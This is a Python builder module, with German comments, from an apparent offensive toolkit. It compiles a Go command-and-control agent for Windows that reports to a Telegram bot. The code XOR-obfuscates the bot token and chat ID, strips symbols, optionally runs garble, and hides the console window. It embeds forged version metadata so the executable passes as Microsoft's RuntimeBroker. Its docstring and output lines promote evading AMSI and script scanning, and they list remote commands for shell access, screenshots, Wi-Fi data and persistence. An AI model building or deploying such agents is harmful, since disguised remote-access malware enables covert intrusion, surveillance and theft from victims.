"""
Go-Agent Builder — kompiliert einen Windows EXE C2-Agent aus dem Go-Template.

Vorteile gegenüber PS1:
  - Kein PowerShell → kein AMSI
  - Kein Script-Scanning
  - XOR-obfuskierte Credentials (kein Klartext im Binary)
  - Symbols stripped → schwerer zu reverse-engineeren
  - PE-Metadaten: sieht aus wie echter Microsoft RuntimeBroker
  - Läuft überall: kein HTTP-Server nötig nach Delivery
"""
from __future__ import annotations
import os
import random
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Go Agent Builder",
    description="Kompiliert Windows EXE C2-Agent (Go, XOR-obfuskiert, Microsoft PE-Metadaten).",
    usage="Token + Chat-ID eingeben → agent.exe wird gebaut.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="agent.exe startet, meldet sich via Telegram, antwortet auf !shell Befehle",
)

DANGER = DangerLevel.BLACK

_TMPL  = Path(__file__).parent / "go_agent" / "agent.go.tmpl"
_GOMOD = "module agent\n\ngo 1.21\n"

# PE version info — sieht aus wie echter Windows RuntimeBroker
# Windows .rc source for version info — compiled via windres (mingw)
_VERSION_RC = '''\
#include <windows.h>
VS_VERSION_INFO VERSIONINFO
FILEVERSION     10,0,22621,2506
PRODUCTVERSION  10,0,22621,2506
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904B0"
    BEGIN
      VALUE "CompanyName",      "Microsoft Corporation"
      VALUE "FileDescription",  "Runtime Broker"
      VALUE "FileVersion",      "10.0.22621.2506 (WinBuild.160101.0800)"
      VALUE "InternalName",     "RuntimeBroker"
      VALUE "LegalCopyright",   "\\xa9 Microsoft Corporation. All rights reserved."
      VALUE "OriginalFilename", "RuntimeBroker.exe"
      VALUE "ProductName",      "Microsoft\\xae Windows\\xae Operating System"
      VALUE "ProductVersion",   "10.0.22621.2506"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x0409, 0x04B0
  END
END
'''


def is_go_available() -> bool:
    return shutil.which("go") is not None


def _xenc(s: str, key: int) -> str:
    """String → Go byte-array literal (XOR encoded)."""
    return ','.join(f'0x{b ^ key:02X}' for b in s.encode('utf-8'))


def _find_windres() -> str | None:
    """Sucht x86_64-w64-mingw32-windres (mingw) für Windows COFF .syso."""
    for name in ("x86_64-w64-mingw32-windres", "windres"):
        p = shutil.which(name)
        if p:
            return p
    return None


def generate_source(token: str, chat_id: str, interval: int = 10) -> tuple[str, int]:
    """Returns (go_source, xor_key)."""
    key = random.randint(0x11, 0x7E)
    tmpl = _TMPL.read_text()
    src = (
        tmpl
        .replace('TMPL_XOR_KEY',   f'0x{key:02X}')
        .replace('TMPL_ENC_API',   _xenc("https://api.telegram.org/bot", key))
        .replace('TMPL_ENC_TOKEN', _xenc(token, key))
        .replace('TMPL_ENC_CHAT',  _xenc(chat_id, key))
        .replace('TMPL_SLEEP',     '3')
        .replace('TMPL_INTERVAL',  str(interval))
    )
    return src, key


def build(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
    use_garble: bool = False,
) -> tuple[str | None, str]:
    """
    Kompiliert agent.exe mit PE-Metadaten (Microsoft RuntimeBroker).
    Returns (path_to_exe | None, stderr_log).
    """
    if not is_go_available():
        return None, "Go nicht installiert (apt install golang)"

    src, key = generate_source(token, chat_id, interval)
    out_exe  = os.path.join(output_dir, "agent.exe")
    logs     = []

    with tempfile.TemporaryDirectory() as tmp:
        Path(tmp, "go.mod").write_text(_GOMOD)
        Path(tmp, "main.go").write_text(src)

        # ── PE-Metadaten via windres (Windows COFF .syso) ─────────────────────
        windres = _find_windres()
        if windres:
            rc_path  = Path(tmp, "versioninfo.rc")
            syso_path = Path(tmp, "resource.syso")
            rc_path.write_text(_VERSION_RC)
            r_rc = subprocess.run(
                [windres, "-i", str(rc_path), "-O", "coff", "-o", str(syso_path)],
                capture_output=True, text=True, cwd=tmp,
            )
            if r_rc.returncode != 0 or not syso_path.exists():
                logs.append(f"[!] windres: {r_rc.stderr.strip()}")
            else:
                logs.append("[+] PE-Metadaten eingebettet (Microsoft RuntimeBroker)")
        else:
            logs.append("[!] windres nicht gefunden — kein PE-Metadaten")
            logs.append("    (apt install mingw-w64)")

        env = os.environ.copy()
        env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})

        garble = shutil.which("garble")
        if use_garble and garble:
            cmd = [garble, "-seed=random", "-literals", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]
        else:
            cmd = ["go", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]

        r = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=tmp)
        if r.stderr:
            logs.append(r.stderr)

    if os.path.exists(out_exe):
        return out_exe, "\n".join(logs)
    return None, "\n".join(logs) or "Build fehlgeschlagen (unbekannter Fehler)"


async def run(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
) -> AsyncGenerator[str, None]:
    """Stream-Output für PenKit-Menü."""
    yield "[*] Kompiliere Go-Agent für Windows x64..."
    yield "[*] Keine PS1-Signaturen — kein AMSI — direkte EXE"
    yield ""

    garble_ok  = bool(shutil.which("garble"))
    windres_ok = bool(_find_windres())

    if garble_ok:
        yield "[*] garble gefunden → erweiterte Obfuskierung aktiv"
    else:
        yield "[!] garble nicht gefunden → Standard-Build"
        yield "    (go install mvdan.cc/garble@latest)"

    if windres_ok:
        yield "[*] windres gefunden → PE-Metadaten: Microsoft RuntimeBroker"
    else:
        yield "[!] windres nicht gefunden → kein PE-Metadaten"
        yield "    (apt install mingw-w64)"
    yield ""

    exe, log = build(token, chat_id, output_dir, interval, use_garble=garble_ok)

    for line in log.strip().splitlines():
        yield f"  {line}"

    if exe:
        size = os.path.getsize(exe)
        yield ""
        yield f"[+] agent.exe gebaut: {exe}"
        yield f"[+] Größe: {size:,} Bytes"
        yield ""
        yield "[*] Delivery:"
        yield "    Direkt ausführen:  agent.exe"
        yield "    Via HTA/HTTP:      Auto-Delivery benutzt agent.exe automatisch"
        yield ""
        yield "[*] Nach Ausführung auf Ziel:"
        yield "    → Task Manager zeigt: RuntimeBroker.exe (Microsoft Corporation)"
        yield "    → Telegram-Nachricht '🟢 Agent online'"
        yield "    → Befehle: !help  !sysinfo  !screenshot  !wifi  !persist  !exit"
    else:
        yield ""
        yield "[!] Build fehlgeschlagen — siehe Fehler oben"
